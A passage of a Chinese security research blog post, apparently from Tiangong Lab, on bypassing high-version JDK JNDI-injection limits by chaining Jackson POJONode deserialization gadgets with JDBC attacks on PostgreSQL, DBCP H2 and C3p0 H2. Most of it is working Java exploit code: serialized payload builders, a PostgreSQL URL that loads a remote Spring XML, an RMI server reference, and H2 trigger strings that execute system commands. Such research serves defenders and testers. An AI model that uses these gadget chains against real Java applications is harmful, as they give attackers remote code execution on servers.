+</span></span><span style="display:flex;"><span>InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler) constructor.<span style="color:#a6e22e">newInstance</span>(advisedSupport);
+</span></span><span style="display:flex;"><span>Object proxy <span style="color:#f92672">=</span> Proxy.<span style="color:#a6e22e">newProxyInstance</span>(ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(),  <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span> {Templates.<span style="color:#a6e22e">class</span>}, handler);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POJONode pojoNode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POJONode(proxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BadAttributeValueExpException badAttributeValueExpException  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BadAttributeValueExpException (<span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>fieldName <span style="color:#f92672">=</span> badAttributeValueExpException.<span style="color:#a6e22e">getClass</span>().<span style="color:#a6e22e">getDeclaredField</span>(<span style="color:#e6db74">&#34;val&#34;</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>fieldName.<span style="color:#a6e22e">set</span>(badAttributeValueExpException, pojoNode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ByteArrayOutputStream baos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(baos);
+</span></span><span style="display:flex;"><span>oos.<span style="color:#a6e22e">writeObject</span>(badAttributeValueExpException);
+</span></span></code></pre></div><h2 id="四使用-jdbc-attack-扩展-jndi-注入攻击面">四、使用 JDBC Attack 扩展 JNDI 注入攻击面<a hidden class="anchor" aria-hidden="true" href="#四使用-jdbc-attack-扩展-jndi-注入攻击面">#</a></h2>
+<p>上面的利用方式可以对于 Spring Boot 差不多进行通杀，但是还有一个问题是 TemplatesImpl 在最新的高版本 JDK 里是用不了的，那么圈子又兜回去了，对于高版本的 JDK 我们也需要一种可用的攻击手法才行。</p>
+<p>这时候就可以考虑通过 JDBC Attack 来实现，我们回顾刚才的链，jackson 的链可以触发任意 getter，而 JDBC 中 getConnection 是 JDBC Attack 的触发点，那么就可以将 JDBC 与原生反序列化结合起来，先打 Jackson 链，然后去触发后续的 JDBC Attack。</p>
+<h3 id="41-postgresql">4.1 Postgresql<a hidden class="anchor" aria-hidden="true" href="#41-postgresql">#</a></h3>
+<p>这里首先我们通过 jackson 来触发 getter 的利用，然后创建一个 pgsql 的 datasource，把恶意的 url 塞进其中，就可以进行 getter 的后利用，就可以实现无 TemplatesImpl 的 RCE。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>CtClass ctClass <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;com.fasterxml.jackson.databind. node.BaseJsonNode&#34;</span>);
+</span></span><span style="display:flex;"><span>CtMethod writeReplace <span style="color:#f92672">=</span> ctClass.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;writeReplace&#34;</span>);
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#a6e22e">removeMethod</span>(writeReplace);
+</span></span><span style="display:flex;"><span>ctClass.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CtClass ctClass1 <span style="color:#f92672">=</span> ClassPool.<span style="color:#a6e22e">getDefault</span>().<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;org.postgresql .ds.common.BaseDataSource&#34;</span>);
+</span></span><span style="display:flex;"><span>CtMethod writeReplace1 <span style="color:#f92672">=</span> ctClass1.<span style="color:#a6e22e">getDeclaredMethod</span>(<span style="color:#e6db74">&#34;getURL&#34;</span>);
+</span></span><span style="display:flex;"><span>ctClass1.<span style="color:#a6e22e">removeMethod</span>(writeReplace1);
+</span></span><span style="display:flex;"><span>ctClass1.<span style="color:#a6e22e">toClass</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:postgresql://node/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;socketFactoryArg=http://127.0.0.1:2333/test.xml&#34;</span>;
+</span></span><span style="display:flex;"><span>PGSimpleDataSource dataSource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> PGSimpleDataSource();
+</span></span><span style="display:flex;"><span>dataSource.<span style="color:#a6e22e">setURL</span>(command);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>AdvisedSupport advisedSupport <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AdvisedSupport();
+</span></span><span style="display:flex;"><span>advisedSupport.<span style="color:#a6e22e">setTarget</span>(dataSource);
+</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span>).<span style="color:#a6e22e">getConstructor</span>(AdvisedSupport.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler) constructor .<span style="color:#a6e22e">newInstance</span>(advisedSupport);
+</span></span><span style="display:flex;"><span>Object proxy <span style="color:#f92672">=</span> Proxy.<span style="color:#a6e22e">newProxyInstance</span>(ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(), <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{DataSource.<span style="color:#a6e22e">class</span>}, handler);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>POJONode pojoNode <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> POJONode(proxy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HotSwappableTargetSource hotSwappableTargetSource1 <span style="color:#f92672">=</span>  <span style="color:#66d9ef">new</span> HotSwappableTargetSource(pojoNode);
+</span></span><span style="display:flex;"><span>HotSwappableTargetSource hotSwappableTargetSource2 <span style="color:#f92672">=</span>  <span style="color:#66d9ef">new</span> HotSwappableTargetSource(<span style="color:#66d9ef">new</span> XString(<span style="color:#66d9ef">null</span>));
+</span></span><span style="display:flex;"><span>HashMap exp <span style="color:#f92672">=</span> makeMap(hotSwappableTargetSource1, hotSwappableTargetSource2);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ByteArrayOutputStream baos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ByteArrayOutputStream();
+</span></span><span style="display:flex;"><span>ObjectOutputStream oos <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ObjectOutputStream(baos);
+</span></span><span style="display:flex;"><span>oos.<span style="color:#a6e22e">writeObject</span>(exp);
+</span></span></code></pre></div><p>对于 PgSQL 使用 Jackson 链时，会遇到一个如下的报错：</p>
+<p><img loading="lazy" src="/attachments/2024-07-24-jdbc-attack-jndi-bypass/aac2f60a-7994-4b35-8667-bdcfd3edba5b.png" alt=""  />
+</p>
+<p>这是因为 Jackson 在处理 getter 时不区分大小写，将 PgSQL 的两个 getter 识别为冲突，为了解决这个问题，我们同样可以使用 aop 代理的方法，套一层 DataSource 的接口类来解决，即 Payload 的该部分。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>AdvisedSupport advisedSupport <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AdvisedSupport();
+</span></span><span style="display:flex;"><span>advisedSupport.<span style="color:#a6e22e">setTarget</span>(dataSource);
+</span></span><span style="display:flex;"><span>Constructor constructor <span style="color:#f92672">=</span> Class.<span style="color:#a6e22e">forName</span>(<span style="color:#e6db74">&#34;org.springframework.aop.framework.JdkDynamicAopProxy&#34;</span>).<span style="color:#a6e22e">getConstructor</span>(AdvisedSupport.<span style="color:#a6e22e">class</span>);
+</span></span><span style="display:flex;"><span>constructor.<span style="color:#a6e22e">setAccessible</span>(<span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>InvocationHandler handler <span style="color:#f92672">=</span> (InvocationHandler)  constructor.<span style="color:#a6e22e">newInstance</span>(advisedSupport);
+</span></span><span style="display:flex;"><span>Object proxy <span style="color:#f92672">=</span> Proxy.<span style="color:#a6e22e">newProxyInstance</span>(ClassLoader.<span style="color:#a6e22e">getSystemClassLoader</span>(), <span style="color:#66d9ef">new</span> Class<span style="color:#f92672">[]</span>{DataSource.<span style="color:#a6e22e">class</span>}, handler);
+</span></span></code></pre></div><p>同时，这里使用的 HotSwappableTargetSource 与 XString 的利用，也是由于高版本 JDK 不支持 BadAttributeValueExpException 而做出的替换，该利用是可以在高版本 JDK 直接使用的。</p>
+<h3 id="42-dbcp-h2">4.2 Dbcp H2<a hidden class="anchor" aria-hidden="true" href="#42-dbcp-h2">#</a></h3>
+<p>对于 Dbcp H2 我们可以进行如下利用，将 Jackson 链中 POJONode 的参数的 dataSource 替换为如下代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;rmi://127.0.0.1:1099/Exploit&#34;</span>;
+</span></span><span style="display:flex;"><span>SharedPoolDataSource dataSource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SharedPoolDataSource();
+</span></span><span style="display:flex;"><span>dataSource.<span style="color:#a6e22e">setDataSourceName</span>(command);
+</span></span></code></pre></div><p>同时构造如下的高版本 JDK 可用的 rmi server，并将其设置为 dataSource 的 URL 来进行请求。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Registry registry <span style="color:#f92672">=</span> LocateRegistry.<span style="color:#a6e22e">createRegistry</span>(rmi_port);
+</span></span><span style="display:flex;"><span>ResourceRef ref <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ResourceRef(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;javax.sql.DataSource&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;org.apache.commons.dbcp2.BasicDataSourceFactory&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">null</span>);
+</span></span><span style="display:flex;"><span>String JDBC_URL <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(&#39;open -a Calculator&#39;)\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;$$\n&#34;</span>;
+</span></span><span style="display:flex;"><span>ref.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;driverClassName&#34;</span>,<span style="color:#e6db74">&#34;org.h2.Driver&#34;</span>));
+</span></span><span style="display:flex;"><span>ref.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;url&#34;</span>,JDBC_URL));
+</span></span><span style="display:flex;"><span>ref.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;username&#34;</span>,<span style="color:#e6db74">&#34;root&#34;</span>));
+</span></span><span style="display:flex;"><span>ref.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;password&#34;</span>,<span style="color:#e6db74">&#34;password&#34;</span>));
+</span></span><span style="display:flex;"><span>ref.<span style="color:#a6e22e">add</span>(<span style="color:#66d9ef">new</span> StringRefAddr(<span style="color:#e6db74">&#34;initialSize&#34;</span>,<span style="color:#e6db74">&#34;1&#34;</span>));
+</span></span></code></pre></div><h3 id="43-c3p0-h2">4.3 C3p0 H2<a hidden class="anchor" aria-hidden="true" href="#43-c3p0-h2">#</a></h3>
+<p>对于 C3p0 H2，我们可以进行如下利用，最终也是落脚到 JavaScript 引擎的命令执行，我们同样需要将 Jackson 链中 POJONode 的参数的 dataSource 替换为如下代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>String command <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;INFORMATION_SCHEMA.TABLES AS $$//javascript\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;java.lang.Runtime.getRuntime().exec(&#39;open -a Calculator&#39;)\n&#34;</span> <span style="color:#f92672">+</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;$$\n&#34;</span>;
+</span></span><span style="display:flex;"><span>ComboPooledDataSource dataSource <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ComboPooledDataSource();
+</span></span><span style="display:flex;"><span>dataSource.<span style="color:#a6e22e">setJdbcUrl</span>(command);
+</span></span></code></pre></div><h2 id="五总结">五、总结<a hidden class="anchor" aria-hidden="true" href="#五总结">#</a></h2>
+<p>本文首先回顾了基础的 JDBC 与 JDBC Attack 利用，然后分析了高版本 JDK 下 JNDI 注入遇到的困境与可行的解决方案，最后探讨了了使用 JDBC Attack 与原生反序列化结合来扩充高版本 JDK 下 JNDI 注入的思路。</p>
+<p>在高版本 JDK 的 JNDI 注入中，我们无法像低版本的 JDK 一样直接进行利用，需要寻找目标本地依赖的攻击面，根据不同的目标进行具体的利用，JDBC 中的 getter 利用是可行的选择之一。</p>
+<h2 id="六参考链接">六、参考链接<a hidden class="anchor" aria-hidden="true" href="#六参考链接">#</a></h2>
+<ol>
+<li><a href="https://tttang.com/archive/1462/">Make JDBC Attacks Brilliant Again 番外篇</a></li>
+<li><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">Deserial Sink With JDBC</a></li>
+<li><a href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&amp;%20Chen%20Hongkun.pdf">Make JDBC Attack Brilliant Again</a></li>
+</ol>
+
+
+  </div>
+
+  <footer class="post-footer">
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/blog/tiangongarticle041/">
+    <span class="title">« 上一页</span>
+    <br>
+    <span>Git 出乎意料的攻击面</span>
+  </a>
+  <a class="next" href="http://localhost:1313/blog/tiangongarticle039/">
+    <span class="title">下一页 »</span>
+    <br>
+    <span>Rust逆向入门：从反编译视角学习内存模型</span>
+  </a>
+</nav>
+
+
+
+
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>© <a href="https://poc.qianxin.com/home">天工实验室</a></span>
+        
+
+    
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = '复制';
+
+        function copyingDone() {
+            copybutton.innerHTML = '已复制！';
+            setTimeout(() => {
+                copybutton.innerHTML = '复制';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
